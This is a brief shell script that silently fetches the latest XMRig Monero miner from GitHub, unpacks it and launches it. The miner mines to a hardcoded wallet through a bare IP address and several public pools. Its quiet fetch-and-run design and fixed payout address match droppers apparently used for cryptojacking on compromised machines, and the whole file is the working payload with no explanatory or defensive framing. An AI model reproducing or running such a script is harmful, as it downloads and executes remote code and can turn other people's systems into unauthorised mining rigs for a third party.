#!/bin/sh

curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "xmrig.*tar.gz" | cut -d : -f 2,3 | tr -d \" | wget -qi  - -O xm.tar.gz
mkdir xm
tar xvf xm.tar.gz -C xm --strip-components=1
chmod +x ./xm/xmrig
./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o 84.32.248.177:3333 --nicehash -o pool.supportxmr.com:443 --nicehash -o monerohash.com:9999 --nicehash -o  pool.supportxmr.com:3333 -u 47STP8dQQCyNNzpjFq7H3hfpTKLmw7A6TFZ8etZg7RQ47NNeF4RR2Dn7bb2ztgVpHQeJisn7Hnv2KAerjt3dG4bfRsDKpVV -p hash1 -k

